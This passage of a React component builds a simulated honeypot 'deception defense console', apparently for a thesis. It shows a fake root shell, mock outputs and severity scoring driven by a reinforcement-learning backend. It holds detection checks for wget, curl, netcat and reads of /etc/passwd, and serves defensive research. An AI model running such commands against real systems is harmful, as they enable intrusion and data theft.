  const [sortField, setSortField] = useState<keyof DeceptionEvent>("timestamp");
  const [sortDir, setSortDir] = useState<"asc" | "desc">("desc");

  // Get unique tactics for filtering
  const availableTactics = Array.from(new Set(deceptionEvents.map(e => e.tactic)));

  // Filter & Sort deceptionEvents
  const processedEvents = [...deceptionEvents]
    .filter(evt => {
      const matchSearch = 
        evt.cmd.toLowerCase().includes(logSearch.toLowerCase()) ||
        evt.tactic.toLowerCase().includes(logSearch.toLowerCase()) ||
        evt.target.toLowerCase().includes(logSearch.toLowerCase()) ||
        evt.spoofedInfo.toLowerCase().includes(logSearch.toLowerCase()) ||
        evt.attackerResponse.toLowerCase().includes(logSearch.toLowerCase());
      
      const matchTactic = selectedTactic === "ALL" || evt.tactic === selectedTactic;
      
      return matchSearch && matchTactic;
    })
    .sort((a, b) => {
      let valA = a[sortField];
      let valB = b[sortField];
      
      if (typeof valA === 'string' && typeof valB === 'string') {
        const comparison = valA.localeCompare(valB);
        return sortDir === 'asc' ? comparison : -comparison;
      }
      
      if (typeof valA === 'number' && typeof valB === 'number') {
        return sortDir === 'asc' ? valA - valB : valB - valA;
      }
      
      return 0;
    });

  const handleSort = (field: keyof DeceptionEvent) => {
    if (sortField === field) {
      setSortDir(prev => prev === "asc" ? "desc" : "asc");
    } else {
      setSortField(field);
      setSortDir("asc");
    }
  };

  const [manualInput, setManualInput] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);

  const typingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const processingTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const terminalEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalLog, typingText]);

  const handleTerminalClick = () => {
    inputRef.current?.focus();
  };

  const handleManualSubmit = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      const cmd = manualInput.trim();
      if (!cmd) return;
      setManualInput("");

      if (cmd === 'clear') {
        if (liveSessionCommands.length > 0) {
          const id = `SESS-LIVE-${Math.floor(1000 + Math.random() * 9000)}`;
          const archivedObj: SessionRecord = {
            id,
            name: `User Manual Session #${pastSessions.length + 1}`,
            timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
            commands: [...liveSessionCommands],
            sqsData: [...sqsHistory]
          };
          setPastSessions(prev => [archivedObj, ...prev]);
          setLiveSessionCommands([]);
        }
        setTerminalLog([]);
        setSqsHistory([{ time: 0, sqs: 10 }]);
        setDeceptionEvents([]);
        setActiveProfile(null);
        setCurrentAction(null);
        setActiveTrappingStep(0);
        return;
      }

      // Interrupt running simulation
      if (typingIntervalRef.current) clearInterval(typingIntervalRef.current);
      if (processingTimeoutRef.current) clearTimeout(processingTimeoutRef.current);
      setProfileQueue([]);
      setActiveProfile("manual");
      setTypingText("");

      // Provide mock output for manual commands
      let mockOut = `bash: ${cmd.split(" ")[0]}: command not found`;
      if (cmd.startsWith("echo ")) mockOut = cmd.substring(5);
      else if (cmd.includes("whoami")) mockOut = "root";
      else if (cmd.includes("pwd")) mockOut = "/root";
      else if (cmd.includes("ls")) mockOut = "file1.txt  file2.txt  payload.sh  .hidden_dir  prod_db_v3_backup.sql";
      else if (cmd.includes("wget")) mockOut = "Connecting to remote... 200 OK\nSaved.";
      else if (cmd.includes("nmap")) mockOut = "Starting Nmap...\nHost is up.\n22/tcp open ssh";
      else if (cmd.includes("chmod")) mockOut = "";
      else if (cmd.includes("nc ") || cmd.includes("netcat")) mockOut = "Connection established.";
      else if (cmd.includes("cat /etc/passwd")) mockOut = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndb_vault_sync:x:1021:1021::/var/lib/db:/bin/bash";

      executeCommand(cmd, mockOut);
    }
  };

  const launchProfile = (profileName: keyof typeof PROFILES) => {
      if (typingIntervalRef.current) clearInterval(typingIntervalRef.current);
      if (processingTimeoutRef.current) clearTimeout(processingTimeoutRef.current);
      
      if (liveSessionCommands.length > 0) {
        const id = `SESS-LIVE-${Math.floor(1000 + Math.random() * 9000)}`;
        const archivedObj: SessionRecord = {
          id,
          name: `User Manual Session #${pastSessions.length + 1}`,
          timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
          commands: [...liveSessionCommands],
          sqsData: [...sqsHistory]
        };
        setPastSessions(prev => [archivedObj, ...prev]);
        setLiveSessionCommands([]);
      }

      setActiveProfile(profileName);
      setTerminalLog([]);
      setTypingText("");
      setProfileQueue([...PROFILES[profileName]]);
      setCommandHistory([]);
      setRlState({
         num_commands: 0,
         time_alive: 0,
         unique_commands: 0,
         last_command: 0,
         repetitive: 0,
         command_type: 0
      });
      setSqsHistory([{time: 0, sqs: 10}]);
      setDeceptionEvents([...INITIAL_DECEPTION_EVENTS]);
      setCurrentAction(null);
      setActiveTrappingStep(0);
  };

  useEffect(() => {
     if (profileQueue.length > 0 && typingText === "" && !typingIntervalRef.current) {
         const currentCmd = profileQueue[0];
         let i = 0;
         setActiveTrappingStep(1); // 1. Attacker is typing/performing action
         typingIntervalRef.current = setInterval(() => {
             i++;
             setTypingText(currentCmd.cmd.slice(0, i));
             if (i >= currentCmd.cmd.length) {
                 clearInterval(typingIntervalRef.current!);
                 typingIntervalRef.current = null;
                 
                 processingTimeoutRef.current = setTimeout(() => {
                     executeCommand(currentCmd.cmd, currentCmd.out);
                 }, 400);
             }
         }, Math.random() * 50 + 30); // Variable typing speed
     }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [profileQueue, typingText]);

  // Automated Replay ticks and typewrite effects
  const replayTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    if (!isReplaying || !replaySession || replayIsPaused) {
      if (replayTimeoutRef.current) {
        clearTimeout(replayTimeoutRef.current);
        replayTimeoutRef.current = null;
      }
      return;
    }

    const currentCmds = replaySession.commands;
    if (replayCommandIndex >= currentCmds.length) {
      // Replay completed
      return;
    }

    // Type out the current command
    const activeCmd = currentCmds[replayCommandIndex];
    let currentChar = 0;
    setReplayTypingText("");

    const typingSpeed = 35 / replaySpeed;

    const interval = setInterval(() => {
      currentChar++;
      setReplayTypingText(activeCmd.cmd.substring(0, currentChar));
      
      if (currentChar >= activeCmd.cmd.length) {
        clearInterval(interval);
        
        // Wait and advance command index
        replayTimeoutRef.current = setTimeout(() => {
          setReplayCommandIndex(prev => prev + 1);
        }, 1300 / replaySpeed);
      }
    }, typingSpeed);

    return () => {
      clearInterval(interval);
      if (replayTimeoutRef.current) {
        clearTimeout(replayTimeoutRef.current);
      }
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isReplaying, replaySession, replayCommandIndex, replayIsPaused, replaySpeed]);

  const executeCommand = async (cmd: string, out: string) => {
      setTypingText("");
      setTerminalLog(prev => [...prev, { type: 'cmd', text: cmd }]);
      setActiveTrappingStep(2); // 2. Decision evaluation sequence
      setBackendStatus('evaluating');

      // 1. Locally compute feature states to reconstruct state vector for the API request
      const nextCampaignHistory = [...commandHistory, cmd];
      setCommandHistory(nextCampaignHistory);

      const cmdType = classifyCommand(cmd);
      const numCmds = nextCampaignHistory.length;
      const uniqueCmds = new Set(nextCampaignHistory).size;
      const lastCmdEnc = encodeCommand(cmd);
      const isRep = nextCampaignHistory.filter(c => c === cmd).length > 1 ? 1 : 0;
      const timeAliveCalculated = numCmds * 5 + Math.floor(Math.random() * 5 + 130);

      const statePayload = {
         num_commands: numCmds,
         time_alive: timeAliveCalculated,
         unique_commands: uniqueCmds,
         last_command: lastCmdEnc,
         repetitive: isRep,
         command_type: cmdType
      };

      setRlState(statePayload);

      let action = 0;
      let apiData = null;

      try {
        const res = await fetch("/api/rl-action", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(statePayload)
        });

        if (!res.ok) {
          throw new Error(`REST API returned status: ${res.status}`);
        }

        const resData = await res.json();
        if (resData && resData.success && resData.decision) {
          action = resData.decision.action;
          apiData = resData;
          setLastApiTrace(resData);
          setBackendStatus('online');
          setCurrentAction(action);
        } else {
          throw new Error("Invalid API response format structure");
        }
      } catch (err: any) {
        console.warn("[Honeypot Console] Backend RL final_model unreachable. Triggered local heuristic fallback.", err);
        setBackendStatus('offline');
        
        // Safety Fallback to local heuristic model
        action = decideAction({ command_type: cmdType });
        setCurrentAction(action);
      }

      // 2. Suspected Query Severity (SQS) calculation updates
      setSqsHistory(prevSqs => {
          const last = prevSqs[prevSqs.length - 1];
          let nextSqs = last.sqs;
          
          if (cmdType === 3) {
              nextSqs += 10;
          } else if (cmdType === 2) {
              if (cmd.includes("wget") || cmd.includes("./") || cmd.includes("curl")) {
                  nextSqs += 45;
              } else {
                  nextSqs += 15;
              }
          } else if (cmdType === 1) {
              nextSqs += 15;
          } else {
              nextSqs += 5;
          }
          
          return [...prevSqs, { time: last.time + 1, sqs: Math.min(100, nextSqs) }];
      });

      // 3. Gather fake deception block
      const timeString = new Date().toLocaleTimeString('en-US', { hour12: false });
      const dec = getDeceptionDetail(cmd, downloadTamperMode, sensitiveFileSpoofMode);
      
      // Increment byte spoofs with randomized entropy counts
      setBytesSpoofed(prev => prev + Math.floor(Math.random() * 400 + 150));
      
      setDeceptionEvents(prev => [
          ...prev,
          {
              id: prev.length + 1,
              timestamp: timeString,
              cmd: cmd,
              tactic: dec.tactic,
              target: dec.target,
              spoofedInfo: dec.spoofedInfo,
              attackerResponse: dec.attackerResponse
          }
      ]);

      // 4. Trigger decision-specific timeouts
      const delayMs = action === 1 ? 1800 : 400; // Latency tarpitting takes longer
      
      processingTimeoutRef.current = setTimeout(() => {
          let finalOut = dec.overrideOut !== undefined ? dec.overrideOut : out;
          if (finalOut) {
              if (cmdType === 1 && action === 4 && dec.overrideOut === undefined) {
                  finalOut = "[DECEPTION ENGAGED: Spoofed Tree Mapping]\n" + finalOut;
              }
              if (cmdType === 2 && action === 0 && dec.overrideOut === undefined) {
                  finalOut += "\n\n[SYSTEM ALARM: Payload isolated in sandbox. Analysis initiated.]";
              }
              
              setTerminalLog(plog => [...plog, { type: 'out', text: finalOut }]);
          }
          
          setLiveSessionCommands(prevCmds => [
              ...prevCmds,
              {
                  cmd,
                  out: finalOut,
                  tactic: dec.tactic,
                  target: dec.target,
                  spoofedInfo: dec.spoofedInfo,
                  attackerResponse: dec.attackerResponse,
                  timestamp: timeString
              }
          ]);

          setActiveTrappingStep(3); // 3. Fake Information Served Successfully
          setProfileQueue(pq => pq.slice(1));
          
          // Reset backend to online if not permanently offline
          setBackendStatus(prev => prev === 'offline' ? 'offline' : 'online');
      }, delayMs);
  };

  const currentSqs = sqsHistory[sqsHistory.length - 1].sqs;

  // Derive active command analytical information for the Defender Console metrics
  let activeCommandText = "";
  let activeTactic = "WAITING_FOR_ADVERSARY_ENTRY";
  let activeTarget = "Adversary idle or scanning network ports";
  let activeSpoofedInfo = "Secure chroot jail active. Ready to project false environment blocks on intrusion attempts.";
  let activeAttackerRep = "Hacker seeking initial entry point vectors...";
  let activeOverrideOut = "";
  let activeCmdType = 0;
  let activeActionIndex = currentAction;

  if (isReplaying && replaySession) {
    const activeCmdItem = replaySession.commands[replayCommandIndex - 1] || replaySession.commands[0];
    if (activeCmdItem) {
      activeCommandText = activeCmdItem.cmd;
      activeTactic = activeCmdItem.tactic;
      activeTarget = activeCmdItem.target;
      activeSpoofedInfo = activeCmdItem.spoofedInfo;
      activeAttackerRep = activeCmdItem.attackerResponse;
      activeOverrideOut = activeCmdItem.out;
      activeCmdType = classifyCommand(activeCmdItem.cmd);
    }
  } else if (liveSessionCommands.length > 0) {
    const lastCmd = liveSessionCommands[liveSessionCommands.length - 1];
    activeCommandText = lastCmd.cmd;
    activeTactic = lastCmd.tactic;
    activeTarget = lastCmd.target;
    activeSpoofedInfo = lastCmd.spoofedInfo;
    activeAttackerRep = lastCmd.attackerResponse;
    activeOverrideOut = lastCmd.out;
    activeCmdType = classifyCommand(lastCmd.cmd);
  } else {
    activeCommandText = "awaiting intrusion...";
    activeTactic = "MONITOR_MODE";
    activeTarget = "Pre-attack reconnaissance scan";
    activeSpoofedInfo = "Monitoring baseline kernel and listening socket system profiles.";
    activeAttackerRep = "Hacker scanning ports seeking entry vectors...";
    activeOverrideOut = "Connection established.\nListening logs initialized in quiet mode.";
    activeCmdType = 0;
  }

  return (
    <div className="min-h-screen lg:h-screen bg-[#050907] text-[#22c55e] font-mono flex flex-col p-2 sm:p-4 overflow-hidden">
      
      {/* Header */}
      <header className="mb-4 flex flex-col sm:flex-row justify-between items-start sm:items-center border-b border-[#14532d] pb-3 px-2 shrink-0">
        <div className="flex items-center gap-3">
          <Shield className="w-8 h-8 text-[#10b981] animate-pulse" />
          <div>
            <h1 className="text-xl sm:text-2xl font-bold text-[#10b981] tracking-tight relative">
              RL-Driven Deception Defense Console
              <span className="absolute -top-1 -right-4 w-2 h-2 bg-[#10b981] rounded-full animate-ping"></span>
            </h1>
            <p className="text-xs text-[#059669] mt-1 uppercase tracking-widest">Master's Thesis Simulation Env: PPO_HONEYPOT_V1</p>
          </div>
        </div>
        <div className="mt-2 sm:mt-0 flex flex-wrap items-center gap-3 text-xs">
          <div className="flex items-center gap-2">
            <span className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse"></span>
            <span className="text-red-500 uppercase font-semibold text-[10px]">Attacker Containment: Active</span>
          </div>
          <div className="px-3 py-1 bg-gradient-to-r from-emerald-950 to-emerald-900 text-[#34d399] rounded-full border border-emerald-700 font-semibold shadow-[0_0_10px_rgba(16,185,129,0.15)] text-[10px]">
            SANDBOX ZONE: SECURE JAIL [100%]
          </div>
        </div>
      </header>

      {/* Main Grid: Strict Dual-Pane Layout */}
      <div className="flex-1 grid grid-cols-1 lg:grid-cols-12 gap-5 min-h-0 overflow-hidden pb-1">
        
        {/* LEFT PANE: What the Hacker Sees (Col-span-5 of 12) */}
        <div className="col-span-12 lg:col-span-5 flex flex-col min-h-0 h-[480px] lg:h-full">
          <div className="flex items-center justify-between px-3 py-2 bg-[#1c2434]/40 border-t border-r border-l border-[#064e3b] rounded-t-xl select-none shrink-0">
            <span className="text-xs text-sky-400 font-semibold flex items-center gap-1.5 uppercase tracking-wider">
              <span className="w-2 h-2 rounded-full bg-sky-500 animate-pulse"></span>
              CONTAINED TTY CONSOLE (Hacker Workspace)
            </span>
            <span className="text-[10px] text-emerald-700 uppercase">Interactive Terminal Frame</span>
          </div>

          <div 
            id="panel-terminal-vector"
            className="flex-1 flex flex-col rounded-b-xl overflow-hidden border border-[#064e3b] shadow-[0_0_20px_rgba(5,150,105,0.05)] bg-[#020617] relative"
            onClick={handleTerminalClick}
          >
            <div className="bg-[#0f172a] h-10 px-4 flex items-center justify-between border-b border-[#1e293b] shrink-0">
               <div className="flex items-center gap-2">
                 <TerminalSquare className="w-4 h-4 text-[#38bdf8]" />
                 <span className="text-xs text-[#94a3b8] font-semibold">root@honeypot:~ (Sandbox Command Line)</span>
               </div>
               <div className="flex gap-1.5">
                 <div className="w-2.5 h-2.5 rounded-full bg-red-500/10 border border-red-500/40"></div>
                 <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/10 border border-yellow-500/40"></div>
                 <div className="w-2.5 h-2.5 rounded-full bg-green-500/10 border border-green-500/40"></div>
               </div>
            </div>
            
            <div className="flex-1 p-4 overflow-y-auto font-mono text-xs leading-relaxed scrollbar-thin scrollbar-thumb-[#1e293b] scrollbar-track-transparent text-[#22c55e]">
              {isReplaying && replaySession ? (
                <>
                  <div className="mb-3 text-amber-500 text-xs uppercase tracking-widest border-b border-amber-900 pb-1 flex justify-between items-center">
                    <span className="flex items-center gap-1.5 font-bold animate-pulse">
                      <span className="w-2 h-2 rounded-full bg-amber-500 animate-ping"></span>
                      📼 PLAYBACK HISTORY IN PROGRESS
                    </span>
                    <span className="text-amber-400 font-bold bg-amber-955/60 p-0.5 px-2 rounded border border-amber-900 text-[10px]">
                      {replaySession.id}
                    </span>
                  </div>

                  <div className="text-[#94a3b8] opacity-70 mb-2 font-mono text-[10px]">SSH Connection Established. Host bounds isolated successfully.</div>

                  {replaySession.commands.slice(0, replayCommandIndex).map((log, idx) => (
                    <React.Fragment key={idx}>
                      <div className="text-[#38bdf8] mb-1 font-semibold">
                        <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>{log.cmd}
                      </div>
                      {log.out && (
                        <div className="text-[#94a3b8] opacity-85 bg-slate-950/40 p-1.5 rounded border border-[#0f172a] mt-1 mb-2 whitespace-pre-wrap text-[10px] leading-normal font-mono">
                          {log.out}
                        </div>
                      )}
                    </React.Fragment>
                  ))}

                  {replayCommandIndex < replaySession.commands.length && (
                    <div className="text-[#38bdf8] mb-1">
                      <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>
                      {replayTypingText}
                      <span className="w-1.5 h-3.5 bg-[#38bdf8] inline-block animate-pulse ml-0.5 align-middle"></span>
                    </div>
                  )}

                  {replayCommandIndex >= replaySession.commands.length && (
                    <div className="text-amber-500 text-xs bg-amber-950/40 p-2 border border-amber-800/40 rounded mt-3 text-center font-bold">
                      ✓ PLAYBACK TRIAL FINISHED. Choose another scenario in the side panel.
                    </div>
                  )}
                </>
              ) : (
                <>
                  <div className="mb-3 text-[#059669] text-xs uppercase tracking-widest border-b border-[#064e3b] pb-1 font-bold">
                    * Active Adversary Keyboard Telemetry *
                  </div>
                  
                  <div className="text-[#94a3b8] opacity-70 mb-2 font-mono">SSH Connection Authenticated. Jailed environment active.</div>
                  <div className="text-[#38bdf8] mb-1 font-semibold">
                    <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>ssh root@10.0.0.5 -p 22
                  </div>
                  <div className="text-[#38bdf8] mb-1 font-semibold">
                    <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>uname -a
                  </div>
                  <div className="text-[#94a3b8] opacity-85 mb-3 bg-slate-950/20 p-1.5 border border-emerald-950 rounded text-[10.5px]">Linux ubuntu 5.4.0-74-generic #83-Ubuntu SMP Tue May 11 17:30:14 UTC 2026 x86_64 x86_64 GNU/Linux</div>

                  {terminalLog.map((log, idx) => (
                    <div key={idx} className={`mb-2 whitespace-pre-wrap ${log.type === 'cmd' ? "text-[#38bdf8] font-semibold" : "text-[#94a3b8] opacity-85 bg-slate-950/40 p-1.5 rounded border border-[#0f172a] mt-1 text-[10.5px] leading-relaxed"}`}>
                      {log.type === 'cmd' && <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>}
                      {log.text}
                    </div>
                  ))}
                  
                  {activeProfile && activeProfile !== 'manual' && (typingText || profileQueue.length > 0) ? (
                    <div className="mb-2 text-[#38bdf8]">
                      <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>
                      {typingText}
                      <span className="w-1.5 h-3.5 bg-[#38bdf8] inline-block animate-pulse ml-1 align-middle"></span>
                    </div>
                  ) : (
                    <div className="mb-2 text-[#38bdf8] flex items-center">
                      <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>
                      <input 
                        ref={inputRef}
                        type="text"
                        value={manualInput}
                        onChange={(e) => setManualInput(e.target.value)}
                        onKeyDown={handleManualSubmit}
                        className="flex-1 bg-transparent border-none outline-none text-[#38bdf8] caret-transparent focus:caret-[#38bdf8] font-medium"
                        autoFocus
                        placeholder="Type standard SSH commands here..."
                        spellCheck={false}
                      />
                    </div>
                  )}
                </>
              )}
              <div ref={terminalEndRef} />
            </div>
            
            <div className="p-2 border-t border-[#064e3b] bg-slate-950/70 text-[10px] text-[#059669] flex justify-between items-center px-4 shrink-0 font-sans">
              {isReplaying ? (
                <>
                  <span className="text-amber-500 font-bold uppercase tracking-wide">📼 TRIAL REPLAY TIMELINE • SPEED {replaySpeed}x</span>
                  <span className="text-amber-600 font-mono font-bold text-[9px]">
                    CMD {Math.min(replayCommandIndex + 1, replaySession ? replaySession.commands.length : 0)} OF {replaySession ? replaySession.commands.length : 0}
                  </span>
                </>
              ) : (
                <>
                  <span>Container Bound: chroot-sandbox</span>
                  <span className="animate-pulse text-xs relative flex items-center gap-1 text-[#10b981] font-bold">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
                    TTY TRANSMITTING ACTIVE KEYSTROKES
                  </span>
                </>
              )}
            </div>
            
            <div className="pointer-events-none absolute inset-0 bg-[linear-gradient(to_bottom,transparent_50%,rgba(0,0,0,0.2)_51%)] bg-[length:100%_4px] opacity-10"></div>
          </div>
        </div>

        {/* RIGHT PANE: Guardian Supervisor Consoles (Col-span-7 of 12) */}
        <div className="col-span-12 lg:col-span-7 flex flex-col min-h-0 h-full overflow-hidden">
          
          {/* Sidepane Scenario Menu triggers */}
          <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between p-3 bg-[#0d1511] border border-[#064e3b] rounded-xl mb-3 shrink-0 gap-3">
            <div>
              <span className="text-[10px] font-bold text-emerald-500 uppercase block tracking-widest">Supervisor Dashboard</span>
              <span className="text-xs font-semibold text-emerald-300">Target Attack Campaign Presets</span>
            </div>

            <div className="grid grid-cols-3 gap-2 text-[10px] flex-1 max-w-sm">
              <button 
                onClick={() => launchProfile('scanner')}
                className={`py-1.5 px-1 rounded-md border text-center transition-all flex items-center justify-center gap-1 bg-[#020617] cursor-pointer
                  ${activeProfile === 'scanner' 
                    ? 'bg-yellow-950/40 border-yellow-500 text-yellow-300 font-bold shadow-[0_0_10px_rgba(234,179,8,0.1)]' 
                    : 'border-[#14532d] text-emerald-500 hover:border-yellow-700 hover:bg-yellow-950/15'}`}
              >
                <Network className="w-3.5 h-3.5 shrink-0" />
                <span>Port Scan</span>
              </button>

              <button 
                onClick={() => launchProfile('malware')}
                className={`py-1.5 px-1 rounded-md border text-center transition-all flex items-center justify-center gap-1 bg-[#020617] cursor-pointer
                  ${activeProfile === 'malware' 
                    ? 'bg-rose-950/40 border-rose-500 text-rose-300 font-bold shadow-[0_0_10px_rgba(239,68,68,0.1)]' 
                    : 'border-[#14532d] text-emerald-500 hover:border-rose-700 hover:bg-rose-950/15'}`}
              >
                <FileWarning className="w-3.5 h-3.5 shrink-0" />
                <span>Run Malware</span>
              </button>

              <button 
                onClick={() => launchProfile('recon')}
                className={`py-1.5 px-1 rounded-md border text-center transition-all flex items-center justify-center gap-1 bg-[#020617] cursor-pointer
                  ${activeProfile === 'recon' 
                    ? 'bg-purple-950/40 border-purple-500 text-purple-300 font-bold shadow-[0_0_10px_rgba(168,85,247,0.1)]' 
                    : 'border-[#14532d] text-emerald-500 hover:border-purple-700 hover:bg-purple-950/15'}`}
              >
                <Crosshair className="w-3.5 h-3.5 shrink-0" />
                <span>Recon State</span>
              </button>
            </div>
          </div>

          {/* Core Tab System */}
          <div className="flex border-b border-emerald-950 pb-2 mb-3 gap-1 shrink-0 overflow-x-auto select-none">
            <button 
              onClick={() => setActiveDeceptionTab('illusion')}
              className={`py-1.5 px-3 rounded-lg text-xs font-bold font-sans transition-all cursor-pointer flex items-center gap-1.5 border ${
                activeDeceptionTab === 'illusion' 
                  ? 'bg-emerald-950 text-emerald-300 border-emerald-700 shadow-[0_0_10px_rgba(16,185,129,0.15)]' 
                  : 'text-emerald-600 border-transparent hover:text-emerald-400 hover:bg-emerald-950/40'
              }`}
            >
              <Info className="w-4 h-4 text-[#10b981]" />
              Real-Time Alert Monitor
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('pipeline')}
              className={`py-1.5 px-3 rounded-lg text-xs font-bold font-sans transition-all cursor-pointer flex items-center gap-1.5 border ${
                activeDeceptionTab === 'pipeline' 
                  ? 'bg-emerald-950 text-emerald-300 border-emerald-700 shadow-[0_0_10px_rgba(16,185,129,0.15)]' 
                  : 'text-emerald-600 border-transparent hover:text-emerald-400 hover:bg-emerald-950/40'
              }`}
            >
              <Cpu className="w-4 h-4 text-[#10b981]" />
              RL Brain State
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('replay')}
              className={`py-1.5 px-3 rounded-lg text-xs font-bold font-sans transition-all cursor-pointer flex items-center gap-1.5 border ${
                activeDeceptionTab === 'replay' 
                  ? 'bg-emerald-950 text-emerald-300 border-emerald-700 shadow-[0_0_10px_rgba(16,185,129,0.15)]' 
                  : 'text-emerald-600 border-transparent hover:text-emerald-400 hover:bg-emerald-950/40'
              }`}
            >
              <Play className="w-4 h-4 text-[#10b981]" />
              Recordings list
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('feed')}
              className={`py-1.5 px-3 rounded-lg text-xs font-bold font-sans transition-all cursor-pointer flex items-center gap-1.5 border ${
                activeDeceptionTab === 'feed' 
                  ? 'bg-emerald-950 text-emerald-300 border-emerald-700 shadow-[0_0_10px_rgba(16,185,129,0.15)]' 
                  : 'text-emerald-600 border-transparent hover:text-emerald-400 hover:bg-emerald-950/40'
              }`}
            >
              <Database className="w-4 h-4 text-[#10b981]" />
              Forensic Audit Ledger ({deceptionEvents.length})
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('diagnostics')}
              className={`py-1.5 px-3 rounded-lg text-xs font-bold font-sans transition-all cursor-pointer flex items-center gap-1.5 border ${
                activeDeceptionTab === 'diagnostics' 
                  ? 'bg-emerald-950 text-emerald-300 border-emerald-700 shadow-[0_0_10px_rgba(16,185,129,0.15)]' 
                  : 'text-emerald-600 border-transparent hover:text-emerald-400 hover:bg-emerald-950/40'
              }`}
            >
              <Activity className="w-4 h-4 text-[#10b981]" />
              RL Model Diagnostics
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('generative')}
              className={`py-1.5 px-3 rounded-lg text-xs font-bold font-sans transition-all cursor-pointer flex items-center gap-1.5 border ${
                activeDeceptionTab === 'generative' 
                  ? 'bg-emerald-950 text-emerald-300 border-emerald-700 shadow-[0_0_10px_rgba(16,185,129,0.15)]' 
                  : 'text-emerald-600 border-transparent hover:text-emerald-400 hover:bg-emerald-950/40'
              }`}
            >
              <Sliders className="w-4 h-4 text-[#10b981]" />
              <span>Generative Decoy Engine</span>
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('threatIntel')}
              className={`py-1.5 px-3 rounded-lg text-xs font-bold font-sans transition-all cursor-pointer flex items-center gap-1.5 border ${
                activeDeceptionTab === 'threatIntel' 
                  ? 'bg-emerald-950 text-emerald-300 border-emerald-700 shadow-[0_0_10px_rgba(16,185,129,0.15)]' 
                  : 'text-emerald-600 border-transparent hover:text-emerald-400 hover:bg-emerald-950/40'
              }`}
            >
              <Radio className="w-4 h-4 text-[#10b981]" />
              <span>Threat Intelligence Feed</span>
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('advisor')}
              className={`py-1.5 px-3 rounded-lg text-xs font-bold font-sans transition-all cursor-pointer flex items-center gap-1.5 border ${
                activeDeceptionTab === 'advisor' 
                  ? 'bg-emerald-950 text-emerald-300 border-emerald-700 shadow-[0_0_10px_rgba(16,185,129,0.15)]' 
                  : 'text-emerald-600 border-transparent hover:text-emerald-400 hover:bg-emerald-950/40'
              }`}
            >
              <Bot className="w-4 h-4 text-[#10b981]" />
              <span>AI Deception Advisor</span>
            </button>
          </div>

          {/* Tab contents panel layout */}
          <div className="flex-1 overflow-y-auto pr-1">
            
            {/* TAB 1: REAL-TIME INTERCEPT ALERTS */}
            {activeDeceptionTab === 'illusion' && (
              <div className="space-y-4">
                
                {/* Visual dynamic real-time Alert Card */}
                <div className={`p-4 rounded-xl border relative overflow-hidden transition-all duration-300 bg-[#020504] shadow-xl ${
                  activeCmdType === 2 
                    ? 'border-rose-900/95 shadow-[0_0_20px_rgba(244,63,94,0.12)]' 
                    : activeCmdType === 3 
                      ? 'border-yellow-900/90 shadow-[0_0_15px_rgba(234,179,8,0.1)]'
                      : activeCmdType === 1 
                        ? 'border-purple-900/90 shadow-[0_0_15px_rgba(168,85,247,0.1)]' 
                        : 'border-[#064e3b]'
                }`}>
                  
                  {/* Glowing header indicators */}
                  <div className="flex justify-between items-center border-b border-emerald-950/80 pb-2 mb-3 select-none">
                    <div className="flex items-center gap-2">
                      <div className={`w-2.5 h-2.5 rounded-full ${
                        activeCmdType === 2 ? 'bg-rose-500 animate-ping' :
                        activeCmdType === 3 ? 'bg-yellow-500 animate-pulse' :
                        activeCmdType === 1 ? 'bg-purple-500 animate-pulse' : 'bg-[#10b981] animate-pulse'
                      }`}></div>
                      <span className={`text-[11px] font-bold uppercase tracking-wider ${
                        activeCmdType === 2 ? 'text-rose-400' :
                        activeCmdType === 3 ? 'text-yellow-400' :
                        activeCmdType === 1 ? 'text-purple-400' : 'text-emerald-400'
                      }`}>
                        {activeCmdType === 2 && "⚡ EXPLOIT INTERCEPT: SEVERE HOST INTRUSION PROBED"}
                        {activeCmdType === 3 && "⚠️ TARGET SCAN: ACTIVE SCANNER FOOTPRINT RECOGNIZED"}
                        {activeCmdType === 1 && "🧬 RECON ENCOUNTERED: BAIT ASSETS CORRELATED"}
                        {activeCmdType === 0 && "ⓘ BASELINE ACTIVE MONITOR: CAPTURING CONTEXT"}
                      </span>
                    </div>
                    <span className="text-[9px] font-mono bg-slate-900 px-2 py-0.5 rounded text-zinc-400 border border-emerald-950">
                      SYS_ALERT
                    </span>
                  </div>

                  {/* Attacker Keystroke Command Block */}
                  <div className="bg-[#020617] p-2.5 rounded border border-sky-950 mb-3 text-xs">
                    <div className="text-[10px] text-sky-500 uppercase tracking-widest font-bold mb-1 font-sans">Incoming Input Command ($)</div>
                    <div className="font-mono text-sky-400 font-bold select-all overflow-x-auto whitespace-nowrap py-0.5">
                      $ {activeCommandText ? activeCommandText : "listening inside chroot jail..."}
                    </div>
                  </div>

                  {/* Dual analytical grids: Intent & Classification */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
                    
                    {/* Intent Frame */}
